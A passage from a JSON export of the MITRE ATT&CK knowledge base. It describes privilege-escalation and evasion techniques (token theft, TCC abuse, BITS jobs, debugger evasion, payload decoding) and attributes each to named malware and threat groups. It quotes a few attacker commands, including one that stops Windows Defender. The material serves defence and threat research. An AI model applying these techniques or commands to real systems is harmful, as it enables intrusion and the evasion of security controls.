be distinct from their own.\nJust-in-time access is a mechanism for granting additional roles to cloud accounts in a granular, temporary manner. This allows accounts to operate with only the permissions they need on a daily basis, and to request additional permissions as necessary. Sometimes just-in-time access requests are configured to require manual approval, while other times the desired permissions are automatically granted.\nAccount impersonation allows user or service accounts to temporarily act with the permissions of another account. For example, in GCP users with the iam.serviceAccountTokenCreator role can create temporary access tokens or sign arbitrary payloads with the permissions of a service account, while service accounts with domain-wide delegation permission are permitted to impersonate Google Workspace accounts. In Exchange Online, the ApplicationImpersonation role allows a service account to use the permissions associated with specified user accounts.\nMany cloud environments also include mechanisms for users to pass roles to resources that allow them to perform tasks and authenticate to other services. While the user that creates the resource does not directly assume the role they pass to it, they may still be able to take advantage of the role's access -- for example, by configuring the resource to perform certain actions with the permissions it has been granted. In AWS, users with the PassRole permission can allow a service they create to assume a given role, while in GCP, users with the iam.serviceAccountUser role can attach a service account to a resource.\nWhile users require specific role assignments in order to use any of these features, cloud administrators may misconfigure permissions. This could result in escalation paths that allow adversaries to gain access to resources beyond what was originally intended.\nNote: this technique is distinct from Additional Cloud Roles, which involves assigning permanent roles to accounts rather than abusing existing permissions structures to gain temporarily elevated access to resources. However, adversaries that compromise a sufficiently privileged account may grant another account they control Additional Cloud Roles that would allow them to also abuse these features. This may also allow for greater stealth than would be had by directly using the highly privileged account, especially when logs do not clarify when role impersonation is taking place.", "id": "T1548.005", "examples": []}, {"name": "TCC Manipulation", "description": "Adversaries can manipulate or abuse the Transparency, Consent, & Control (TCC) service or database to grant malicious executables elevated permissions. TCC is a Privacy & Security macOS control mechanism used to determine if the running process has permission to access the data or services protected by TCC, such as screen sharing, camera, microphone, or Full Disk Access (FDA).", "detailed_description": "Adversaries can manipulate or abuse the Transparency, Consent, & Control (TCC) service or database to grant malicious executables elevated permissions. TCC is a Privacy & Security macOS control mechanism used to determine if the running process has permission to access the data or services protected by TCC, such as screen sharing, camera, microphone, or Full Disk Access (FDA).\nWhen an application requests to access data or a service protected by TCC, the TCC daemon (tccd) checks the TCC database, located at /Library/Application Support/com.apple.TCC/TCC.db (and ~/ equivalent), and an overwrites file (if connected to an MDM) for existing permissions. If permissions do not exist, then the user is prompted to grant permission. Once permissions are granted, the database stores the application's permissions and will not prompt the user again unless reset. For example, when a web browser requests permissions to the user's webcam, once granted the web browser may not explicitly prompt the user again.\nAdversaries may access restricted data or services protected by TCC through abusing applications previously granted permissions through Process Injection or executing a malicious binary using another application. For example, adversaries can use Finder, a macOS native app with FDA permissions, to execute a malicious AppleScript. When executing under the Finder App, the malicious AppleScript inherits access to all files on the system without requiring a user prompt. When System Integrity Protection (SIP) is disabled, TCC protections are also disabled. For a system without SIP enabled, adversaries can manipulate the TCC database to add permissions to their malicious executable through loading an adversary controlled TCC database using environment variables and Launchctl.", "id": "T1548.006", "examples": []}]}, {"name": "Access Token Manipulation", "description": "Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.", "detailed_description": "Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.\nAn adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. Token Impersonation/Theft) or used to spawn a new process (i.e. Create Process with Token). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.\nAny standard user can use the runas command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.", "id": "T1134", "examples": [{"id": "S0622", "name": "AppleSeed", "description": "AppleSeed can gain system level privilege by passing SeDebugPrivilege to the AdjustTokenPrivilege API."}, {"id": "S1068", "name": "BlackCat", "description": "BlackCat has the ability modify access tokens."}, {"id": "G0108", "name": "Blue Mockingbird", "description": "Blue Mockingbird has used JuicyPotato to abuse the SeImpersonate token privilege to escalate from web application pool accounts to NT Authority\\SYSTEM."}, {"id": "C0017", "name": "C0017", "description": "During C0017, APT41 used a ConfuserEx obfuscated BADPOTATO exploit to abuse named-pipe impersonation for local NT AUTHORITY\\SYSTEM privilege escalation."}, {"id": "S0625", "name": "Cuba", "description": "Cuba has used SeDebugPrivilege and AdjustTokenPrivileges to elevate privileges."}, {"id": "S0038", "name": "Duqu", "description": "Duqu examines running system processes for tokens that have specific system privileges. If it finds one, it will copy the token and store it for later use. Eventually it will start new processes with the stored token attached. It can also steal tokens to acquire administrative privileges."}, {"id": "S0363", "name": "Empire", "description": "Empire can use PowerSploit's Invoke-TokenManipulation to manipulate access tokens."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 has used has used Metasploit\u2019s named-pipe impersonation technique to escalate privileges."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium can use token manipulation to bypass UAC on Windows7 systems."}, {"id": "S0697", "name": "HermeticWiper", "description": "HermeticWiper can use AdjustTokenPrivileges to grant itself privileges for debugging with SeDebugPrivilege, creating backups with SeBackupPrivilege, loading drivers with SeLoadDriverPrivilege, and shutting down a local system with SeShutdownPrivilege."}, {"id": "S0203", "name": "Hydraq", "description": "Hydraq creates a backdoor through which remote attackers can adjust token privileges."}, {"id": "S0607", "name": "KillDisk", "description": "KillDisk has attempted to get the access token of a process by calling OpenProcessToken. If KillDisk gets the access token, then it attempt to modify the token privileges with AdjustTokenPrivileges."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can use AdjustTokenPrivileges() to elevate privileges."}, {"id": "S0576", "name": "MegaCortex", "description": "MegaCortex can enable SeDebugPrivilege and adjust token privileges."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 can use Invoke-TokenManipulation for manipulating tokens."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit's Invoke-TokenManipulation Exfiltration module can be used to manipulate tokens."}, {"id": "S0446", "name": "Ryuk", "description": "Ryuk has attempted to adjust its token privileges to have the SeDebugPrivilege."}, {"id": "S0633", "name": "Sliver", "description": "Sliver has the ability to manipulate user tokens on targeted Windows systems."}, {"id": "S0058", "name": "SslMM", "description": "SslMM contains a feature to manipulate process privileges and tokens."}, {"id": "S0562", "name": "SUNSPOT", "description": "SUNSPOT modified its security token to grants itself debugging privileges by adding SeDebugPrivilege."}], "sub_techniques": [{"name": "Token Impersonation/Theft", "description": "Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using DuplicateToken or DuplicateTokenEx. The token can then be used with ImpersonateLoggedOnUser to allow the calling thread to impersonate a logged on user's security context, or with SetThreadToken to assign the impersonated token to a thread.", "detailed_description": "Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using DuplicateToken or DuplicateTokenEx. The token can then be used with ImpersonateLoggedOnUser to allow the calling thread to impersonate a logged on user's security context, or with SetThreadToken to assign the impersonated token to a thread.\nAn adversary may perform Token Impersonation/Theft when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.\nWhen an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally Create Process with Token using CreateProcessWithTokenW or CreateProcessAsUserW. Token Impersonation/Theft is also distinct from Make and Impersonate Token in that it refers to duplicating an existing token, rather than creating a new one.", "id": "T1134.001", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 has used CVE-2015-1701 to access the SYSTEM token and copy it into the current process as part of privilege escalation."}, {"id": "S0456", "name": "Aria-body", "description": "Aria-body has the ability to duplicate a token from ntprint.exe."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can impersonate a lsass.exe or vmtoolsd.exe token."}, {"id": "S0570", "name": "BitPaymer", "description": "BitPaymer can use the tokens of users to create processes on infected systems."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can steal access tokens from exiting processes."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has the ability to duplicate the user\u2019s token. For example, Emotet may use a variant of Google\u2019s ProtoBuf to send messages that specify how code will be executed."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has used a malicious framework designed to impersonate the lsass.exe/vmtoolsd.exe token."}, {"id": "S0182", "name": "FinFisher", "description": "FinFisher uses token manipulation with NtFilterToken as part of UAC bypass."}, {"id": "C0038", "name": "HomeLand Justice", "description": "During HomeLand Justice, threat actors used custom tooling to acquire tokens using ImpersonateLoggedOnUser/SetThreadToken."}, {"id": "S0439", "name": "Okrum", "description": "Okrum can impersonate a logged-on user's security context using a call to the ImpersonateLoggedOnUser API."}, {"id": "S0192", "name": "Pupy", "description": "Pupy can obtain a list of SIDs and provide the option for selecting process tokens to impersonate."}, {"id": "S0496", "name": "REvil", "description": "REvil can obtain the token from the user that launched the explorer.exe process to avoid affecting the desktop of the SYSTEM user."}, {"id": "S0140", "name": "Shamoon", "description": "Shamoon can impersonate tokens using LogonUser, ImpersonateLoggedOnUser, and ImpersonateNamedPipeClient."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can find a process owned by a specific user and impersonate the associated token."}, {"id": "S0623", "name": "Siloscape", "description": "Siloscape impersonates the main thread of CExecSvc.exe by calling NtImpersonateThread."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet attempts to impersonate an anonymous token to enumerate bindings in the service control manager."}, {"id": "S1011", "name": "Tarrask", "description": "Tarrask leverages token theft to obtain lsass.exe security permissions."}]}, {"name": "Create Process with Token", "description": "Adversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as CreateProcessWithTokenW and runas.", "detailed_description": "Adversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as CreateProcessWithTokenW and runas.\nCreating processes with a token not associated with the current user may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used. For example, the token could be duplicated via Token Impersonation/Theft or created via Make and Impersonate Token before being used to create a process.\nWhile this technique is distinct from Token Impersonation/Theft, the techniques can be used in conjunction where a token is duplicated and then used to create a new process.", "id": "T1134.002", "examples": [{"id": "S0456", "name": "Aria-body", "description": "Aria-body has the ability to execute a process using runas."}, {"id": "S0344", "name": "Azorult", "description": "Azorult can call WTSQueryUserToken and CreateProcessAsUser to start a new process with local system privileges."}, {"id": "S0239", "name": "Bankshot", "description": "Bankshot grabs a user token using WTSQueryUserToken and then creates a process by impersonating a logged-on user."}, {"id": "S0363", "name": "Empire", "description": "Empire can use Invoke-RunAs to make tokens."}, {"id": "S0356", "name": "KONNI", "description": "KONNI has duplicated the token of a high integrity process to spawn an instance of cmd.exe under an impersonated user."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group keylogger KiloAlfa obtains user tokens from interactive sessions to execute itself with API call CreateProcessAsUserA under that user's context."}, {"id": "S0501", "name": "PipeMon", "description": "PipeMon can attempt to gain administrative privileges using token impersonation."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 can use Invoke-RunAs to make tokens."}, {"id": "S0496", "name": "REvil", "description": "REvil can launch an instance of itself with administrative rights using runas."}, {"id": "G0010", "name": "Turla", "description": "Turla RPC backdoors can impersonate or steal process tokens before executing commands."}, {"id": "S0689", "name": "WhisperGate", "description": "The WhisperGate third stage can use the AdvancedRun.exe tool to execute commands in the context of the Windows TrustedInstaller group via %TEMP%\\AdvancedRun.exe\" /EXEFilename \"C:\\Windows\\System32\\sc.exe\" /WindowState 0 /CommandLine \"stop WinDefend\" /StartDirectory \"\" /RunAs 8 /Run."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell has a command called RunAs, which creates a new process as another user or process context."}]}, {"name": "Make and Impersonate Token", "description": "Adversaries may make new tokens and impersonate users to escalate privileges and bypass access controls. For example, if an adversary has a username and password but the user is not logged onto the system the adversary can then create a logon session for the user using the LogonUser function. The function will return a copy of the new session's access token and the adversary can use SetThreadToken to assign the token to a thread.", "detailed_description": "Adversaries may make new tokens and impersonate users to escalate privileges and bypass access controls. For example, if an adversary has a username and password but the user is not logged onto the system the adversary can then create a logon session for the user using the LogonUser function. The function will return a copy of the new session's access token and the adversary can use SetThreadToken to assign the token to a thread.\nThis behavior is distinct from Token Impersonation/Theft in that this refers to creating a new user token instead of stealing or duplicating an existing one.", "id": "T1134.003", "examples": [{"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can make tokens from known credentials."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has utilized tools such as Incognito V2 for token manipulation and impersonation."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can create a token for a different user."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can make tokens from known credentials."}]}, {"name": "Parent PID Spoofing", "description": "Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the CreateProcess API call, which supports a parameter that defines the PPID to use. This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via svchost.exe or consent.exe) rather than the current user context.", "detailed_description": "Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the CreateProcess API call, which supports a parameter that defines the PPID to use. This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via svchost.exe or consent.exe) rather than the current user context.\nAdversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of PowerShell/Rundll32 to be explorer.exe rather than an Office document delivered as part of Spearphishing Attachment. This spoofing could be executed via Visual Basic within a malicious Office document or any code that can perform Native API.\nExplicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as lsass.exe), causing the new process to be elevated via the inherited access token.", "id": "T1134.004", "examples": [{"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can spawn processes with alternate PPIDs."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate relies on parent PID spoofing as part of its \"rootkit-like\" functionality to evade detection via Task Manager or Process Explorer."}, {"id": "S0356", "name": "KONNI", "description": "KONNI has used parent PID spoofing to spawn a new cmd process using CreateProcessW and a handle to Taskmgr.exe."}, {"id": "S0501", "name": "PipeMon", "description": "PipeMon can use parent PID spoofing to elevate privileges."}]}, {"name": "SID-History Injection", "description": "Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens.  An account can hold additional SIDs in the SID-History Active Directory attribute , allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).", "detailed_description": "Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens.  An account can hold additional SIDs in the SID-History Active Directory attribute , allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).\nWith Domain Administrator (or equivalent) rights, harvested or well-known SID values  may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as Remote Services, SMB/Windows Admin Shares, or Windows Remote Management.", "id": "T1134.005", "examples": [{"id": "S0363", "name": "Empire", "description": "Empire can add a SID-History to a user if on a domain controller."}, {"id": "S0002", "name": "Mimikatz", "description": "Mimikatz's MISC::AddSid module can append any SID or user/group account to a user's SID-History. Mimikatz also utilizes SID-History Injection to expand the scope of other components such as generated Kerberos Golden Tickets and DCSync beyond a single domain."}]}]}, {"name": "BITS Jobs", "description": "Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM). BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.", "detailed_description": "Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM). BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.\nThe interface to create and manage BITS jobs is accessible through PowerShell and the BITSAdmin tool.\nAdversaries may abuse BITS to download (e.g. Ingress Tool Transfer), execute, and even clean up after running malicious code (e.g. Indicator Removal). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls. BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).\nBITS upload functionalities can also be used to perform Exfiltration Over Alternative Protocol.", "id": "T1197", "examples": [{"id": "G0087", "name": "APT39", "description": "APT39 has used the BITS protocol to exfiltrate stolen data from a compromised host."}, {"id": "G0096", "name": "APT41", "description": "APT41 used BITSAdmin to download and install payloads."}, {"id": "S0534", "name": "Bazar", "description": "Bazar has been downloaded via Windows BITS functionality."}, {"id": "S0190", "name": "BITSAdmin", "description": "BITSAdmin can be used to create BITS Jobs to launch a malicious process."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can download a hosted \"beacon\" payload using BITSAdmin."}, {"id": "S0554", "name": "Egregor", "description": "Egregor has used BITSadmin to download and execute malicious DLLs."}, {"id": "S0201", "name": "JPIN", "description": "A JPIN variant downloads the backdoor payload via the BITS service."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has used BITSAdmin to download additional tools."}, {"id": "S0652", "name": "MarkiRAT", "description": "MarkiRAT can use BITS Utility to connect with the C2 server."}, {"id": "G0040", "name": "Patchwork", "description": "Patchwork has used BITS jobs to download malicious payloads."}, {"id": "S0654", "name": "ProLock", "description": "ProLock can use BITS jobs to download its malicious payload."}, {"id": "S0333", "name": "UBoatRAT", "description": "UBoatRAT takes advantage of the /SetNotifyCmdLine option in BITSAdmin to ensure it stays running on a system to maintain persistence."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used batch scripts that utilizes WMIC to execute a BITSAdmin transfer of a ransomware payload to each compromised machine."}], "sub_techniques": []}, {"name": "Build Image on Host", "description": "Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. A remote build request may be sent to the Docker API that includes a Dockerfile that pulls a vanilla base image, such as alpine, from a public or local registry and then builds a custom image upon it.", "detailed_description": "Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. A remote build request may be sent to the Docker API that includes a Dockerfile that pulls a vanilla base image, such as alpine, from a public or local registry and then builds a custom image upon it.\nAn adversary may take advantage of that build API to build a custom image on the host that includes malware downloaded from their C2 server, and then they may utilize Deploy Container using that custom image. If the base image is pulled from a public registry, defenses will likely not detect the image as malicious since it\u2019s a vanilla image. If the base image already resides in a local registry, the pull may be considered even less suspicious since the image is already in the environment.", "id": "T1612", "examples": [], "sub_techniques": []}, {"name": "Debugger Evasion", "description": "Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads.", "detailed_description": "Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads.\nDebugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar to Virtualization/Sandbox Evasion, if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads.\nSpecific checks will vary based on the target and/or adversary, but may involve Native API function calls such as IsDebuggerPresent() and  NtQueryInformationProcess(), or manually checking the BeingDebugged flag of the Process Environment Block (PEB). Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would \"swallow\" or handle the potential error).\nAdversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping Native API function calls such as OutputDebugStringW().", "id": "T1622", "examples": [{"id": "S1087", "name": "AsyncRAT", "description": "AsyncRAT can use the CheckRemoteDebuggerPresent function to detect the presence of a debugger."}, {"id": "S1070", "name": "Black Basta", "description": "The Black Basta dropper can check system flags, CPU registers, CPU instructions, process timing, system libraries, and APIs to determine if a debugger is present."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee can search for tools used in static analysis."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate checks the BeingDebugged flag in the PEB structure during execution to identify if the malware is being debugged."}, {"id": "S1066", "name": "DarkTortilla", "description": "DarkTortilla can detect debuggers by using functions such as DebuggerIsAttached and DebuggerIsLogging. DarkTortilla can also detect profilers by verifying the COR_ENABLE_PROFILING environment variable is present and active."}, {"id": "S0694", "name": "DRATzarus", "description": "DRATzarus can use IsDebuggerPresent to detect whether a debugger is present on a victim."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus has the ability to check for the presence of debuggers."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can search for debugging tools on a compromised host."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group used tools that used the IsDebuggerPresent call to detect debuggers."}, {"id": "S1145", "name": "Pikabot", "description": "Pikabot features several methods to evade debugging by analysts, including checks for active debuggers, the use of breakpoints during execution, and checking various system information items such as system memory and the number of processors."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin leverages anti-debugging mechanisms through the use of ThreadHideFromDebugger."}, {"id": "S0240", "name": "ROKRAT", "description": "ROKRAT can check for debugging tools."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot has used is_debugger_present as part of its environmental checks."}, {"id": "S0595", "name": "ThiefQuest", "description": "ThiefQuest uses a function named is_debugging to perform anti-debugging logic. The function invokes sysctl checking the returned value of P_TRACED. ThiefQuest also calls ptrace with the PTRACE_DENY_ATTACH flag to prevent debugging."}], "sub_techniques": []}, {"name": "Deobfuscate/Decode Files or Information", "description": "Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.", "detailed_description": "Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows copy /b command to reassemble binary fragments into a malicious payload.\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.", "id": "T1140", "examples": [{"id": "S0469", "name": "ABK", "description": "ABK has the ability to decrypt AES encrypted payloads."}, {"id": "S1028", "name": "Action RAT", "description": "Action RAT can use Base64 to decode actor-controlled C2 server communications."}, {"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla has the ability to decrypt strings encrypted with the Rijndael symmetric encryption algorithm."}, {"id": "G1030", "name": "Agrius", "description": "Agrius has deployed base64-encoded variants of ASPXSpy to evade detection."}, {"id": "S1025", "name": "Amadey", "description": "Amadey has decoded antivirus name strings."}, {"id": "S1133", "name": "Apostle", "description": "Apostle compiled code is obfuscated in an unspecified fashion prior to delivery to victims."}, {"id": "S0584", "name": "AppleJeus", "description": "AppleJeus has decoded files received from a C2."}, {"id": "S0622", "name": "AppleSeed", "description": "AppleSeed can decode its payload prior to execution."}, {"id": "G0073", "name": "APT19", "description": "An APT19 HTTP malware variant decrypts strings using single-byte XOR keys."}, {"id": "G0007", "name": "APT28", "description": "An APT28 macro uses the command certutil -decode to decode contents of a .txt file storing the base64 encoded payload."}, {"id": "G0087", "name": "APT39", "description": "APT39 has used malware to decrypt encrypted CAB files."}, {"id": "S0456", "name": "Aria-body", "description": "Aria-body has the ability to decrypt the loader configuration and payload DLL."}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth uses a fromCharCode() deobfuscation method to avoid explicitly writing execution commands and to hide its code. "}, {"id": "S0347", "name": "AuditCred", "description": "AuditCred uses XOR and RC4 to perform decryption on the code functions."}, {"id": "S0640", "name": "Avaddon", "description": "Avaddon has decrypted encrypted strings."}, {"id": "S0473", "name": "Avenger", "description": "Avenger has the ability to decrypt files downloaded from C2."}, {"id": "S1053", "name": "AvosLocker", "description": "AvosLocker has deobfuscated XOR-encoded strings."}, {"id": "S0344", "name": "Azorult", "description": "Azorult uses an XOR key to decrypt content and uses Base64 to decode the C2 address."}, {"id": "S0638", "name": "Babuk", "description": "Babuk has the ability to unpack itself into memory using XOR."}, {"id": "S0414", "name": "BabyShark", "description": "BabyShark has the ability to decode downloaded files prior to execution."}, {"id": "S0475", "name": "BackConfig", "description": "BackConfig has used a custom routine to decrypt strings."}, {"id": "S0642", "name": "BADFLICK", "description": "BADFLICK can decode shellcode using a custom rotating XOR cipher."}, {"id": "S0234", "name": "Bandook", "description": "Bandook has decoded its PowerShell script."}, {"id": "S0239", "name": "Bankshot", "description": "Bankshot decodes embedded XOR strings."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can decrypt downloaded payloads. Bazar also resolves strings and other artifacts at runtime."}, {"id": "S0470", "name": "BBK", "description": "BBK has the ability to decrypt AES encrypted payloads."}, {"id": "S0127", "name": "BBSRAT", "description": "BBSRAT uses Expand to decompress a CAB file into executable content."}, {"id": "S0574", "name": "BendyBear", "description": "BendyBear has decrypted function blocks using a XOR key during runtime to evade detection."}, {"id": "S0268", "name": "Bisonal", "description": "Bisonal has decoded strings in the malware using XOR and RC4."}, {"id": "S0520", "name": "BLINDINGCAN", "description": "BLINDINGCAN has used AES and XOR to decrypt its DLLs."}, {"id": "S0635", "name": "BoomBox", "description": "BoomBox can decrypt AES-encrypted files downloaded from C2."}, {"id": "S0415", "name": "BOOSTWRITE", "description": "BOOSTWRITE has used a a 32-byte long multi-XOR key to decode data inside its payload."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER downloads encoded payloads and decodes them on the victim."}, {"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 has the ability to deobfuscate its payload prior to execution."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee can deobfuscate C2 server responses and unpack its code on targeted hosts."}, {"id": "S0482", "name": "Bundlore", "description": "Bundlore has used openssl to decrypt AES encrypted payload data. Bundlore has also used base64 and RC4 with a hardcoded key to deobfuscate data."}, {"id": "S1118", "name": "BUSHWALK", "description": "BUSHWALK can Base64 decode and RC4 decrypt malicious payloads sent through a web request\u2019s command parameter."}, {"id": "C0017", "name": "C0017", "description": "During C0017, APT41 used the DUSTPAN loader to decrypt embedded payloads."}, {"id": "C0021", "name": "C0021", "description": "During C0021, the threat actors deobfuscated encoded PowerShell commands including use of the specific string 'FromBase'+0x40+'String', in place of FromBase64String which is normally used to decode base64."}, {"id": "S0335", "name": "Carbon", "description": "Carbon decrypts task and configuration files for execution."}, {"id": "S0348", "name": "Cardinal RAT", "description": "Cardinal RAT decodes many of its artifacts and is decrypted (AES-128) after being downloaded."}, {"id": "S0160", "name": "certutil", "description": "certutil has been used to decode binaries hidden inside certificate files as Base64 information."}, {"id": "S0631", "name": "Chaes", "description": "Chaes has decrypted an AES encrypted binary file to trigger the download of other files."}, {"id": "S0674", "name": "CharmPower", "description": "CharmPower can decrypt downloaded modules prior to execution."}, {"id": "S1149", "name": "CHIMNEYSWEEP", "description": "CHIMNEYSWEEP can use an embedded RC4 key to decrypt Windows API function strings."}, {"id": "S1041", "name": "Chinoxy", "description": "The Chinoxy dropping function can initiate decryption of its config file."}, {"id": "S0667", "name": "Chrommme", "description": "Chrommme can decrypt its encrypted internal code."}, {"id": "G1021", "name": "Cinnamon Tempest", "description": "Cinnamon Tempest has used weaponized DLLs to load and decrypt payloads."}, {"id": "S0660", "name": "Clambling", "description": "Clambling can deobfuscate its payload prior to execution."}, {"id": "S0611", "name": "Clop", "description": "Clop has used a simple XOR operation to decrypt strings."}, {"id": "S1105", "name": "COATHANGER", "description": "COATHANGER decodes configuration items from a bundled file for command and control activity."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can deobfuscate shellcode using a rolling XOR and decrypt metadata from Beacon sessions."}, {"id": "S0369", "name": "CoinTicker", "description": "CoinTicker decodes the initially-downloaded hidden encoded file using OpenSSL."}, {"id": "S0126", "name": "ComRAT", "description": "ComRAT has used unique per machine passwords to decrypt the orchestrator payload and a hardcoded XOR key to decrypt its communications module. ComRAT has also used a unique password to decrypt the file used for its hidden file system."}, {"id": "S0575", "name": "Conti", "description": "Conti has decrypted its payload using a hardcoded AES-256 key."}, {"id": "S0492", "name": "CookieMiner", "description": "CookieMiner has used Google Chrome's decryption and extraction operations."}, {"id": "S0614", "name": "CostaBricks", "description": "CostaBricks has the ability to use bytecode to decrypt embedded payloads."}, {"id": "S0115", "name": "Crimson", "description": "Crimson can decode its encoded PE file prior to execution."}, {"id": "S1153", "name": "Cuckoo 